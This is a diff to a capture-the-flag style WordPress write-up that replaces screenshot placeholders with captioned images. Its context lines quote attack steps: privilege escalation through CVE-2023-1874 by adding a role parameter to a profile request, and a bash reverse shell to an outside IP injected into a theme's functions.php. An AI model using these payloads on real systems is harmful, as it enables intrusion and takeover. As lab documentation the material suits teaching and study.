@@ -47,6 +47,9 @@ nmap -sV -sC 10.128.179.255
 
 The webroot at port 80 served the default Apache landing page, indicating the actual application lived in a subdirectory.
 
+![Initial reconnaissance and service enumeration](recon.png)
+_Reconnaissance results showing the exposed services and initial target enumeration._
+
 ### Directory Enumeration — Webroot
 
 ```bash
@@ -124,7 +127,14 @@ wpscan --url http://10.128.179.255/wordpress/ -e u,p,t
 
 > **Lesson:** The `vp`/`vt` flags in wpscan require an API token to populate CVE data. Without one, use plain `p`/`t` flags to enumerate all plugins/themes regardless of vulnerability status, then cross-reference versions manually.
 
-<!-- Optional screenshots: `wpscanplugin.png`, `wpscanusers.png`, `wpscantitle.png` -->
+![WPScan target and WordPress version detection](wpscantitle.png)
+_WPScan identifying the target WordPress installation and version._
+
+![WP Data Access plugin discovered by WPScan](wpscanplugin.png)
+_WPScan detecting the vulnerable WP Data Access plugin._
+
+![WordPress users discovered by WPScan](wpscanusers.png)
+_WPScan user enumeration revealing the `admin` and `bob` accounts._
 
 ---
 
@@ -162,7 +172,11 @@ The WP Data Access plugin contains a missing authorization check in its `multipl
 
 After logging into WordPress as `bob` (`bob:soccer`), the profile update form was intercepted using **Burp Suite**.
 
-<!-- Optional screenshots: `bob.png`, `burpsuite.png` -->
+![Bob logged in with subscriber-level privileges](bob.png)
+_The `bob` account initially has only subscriber-level access._
+
+![Profile update request intercepted in Burp Suite](burpsuite.png)
+_The WordPress profile update request intercepted before modifying the role parameter._
 
 `bob`'s dashboard confirmed subscriber-level access — only "Dashboard" and "Profile" were visible in the sidebar. The profile update POST request was captured and modified by appending the privilege escalation parameter to the end of the POST body:
 
@@ -178,7 +192,8 @@ _wpnonce=...&first_name=bob&last_name=bob&...&action=update&user_id=2&submit=Upd
 
 The request was forwarded. Upon refreshing the dashboard, `bob` now had full administrator access — Posts, Media, Pages, Appearance, Plugins, Users, Settings, and the WP Data Access menu were all visible.
 
-<!-- Optional screenshots: `asadmin.png` -->
+![Bob after privilege escalation to WordPress administrator](asadmin.png)
+_The dashboard after exploiting CVE-2023-1874, confirming administrator privileges._
 
 > **Lesson:** Missing authorization checks on privileged functions are critical vulnerabilities. The plugin trusted that only admins would submit the `wpda_role[]` parameter — but never verified the caller's actual role before applying the change.
 
@@ -206,9 +221,13 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.155.216/4444 0>&1'");
 
 > **Note:** A common mistake here is adding `<?php ?>` tags around the payload inside a file that is already entirely PHP — this causes a syntax error. The bare `exec()` call is correct.
 
-<!-- Optional screenshots: `phpscriptinjection.png`, `reverseshellworking.png` -->
+![PHP reverse shell payload added through the WordPress theme editor](phpscriptinjection.png)
+_Reverse shell payload inserted into the active theme's `functions.php` file._
 
 Visiting any WordPress page triggered `functions.php` execution, and the listener received a connection:
+
+![Reverse shell received as www-data](reverseshellworking.png)
+_The successful callback from the target, providing a shell as `www-data`._
 
 ```
 connect to [192.168.155.216] from (UNKNOWN) [10.128.179.255] 42248
@@ -517,17 +536,3 @@ When the race is won, youcef's `id_rsa` private key will be printed, allowing SS
       ↓
   youcef → root [PENDING]
 ```
-
-### Images to Include
-
-| Filename | Where to insert |
-|----------|----------------|
-| `recon.png` | Reconnaissance section |
-| `wpscantitle.png` | WordPress Enumeration — WPScan |
-| `wpscanplugin.png` | WordPress Enumeration — Plugin discovery |
-| `wpscanusers.png` | WordPress Enumeration — User enumeration |
-| `bob.png` | Credential Discovery — bob's subscriber dashboard |
-| `burpsuite.png` | CVE-2023-1874 exploitation — Burp interception |
-| `phpscriptinjection.png` | Reverse Shell — Theme file editor injection |
-| `reverseshellworking.png` | Reverse Shell — Shell received |
-| `asadmin.png` | Privilege Escalation — bob as WordPress admin |
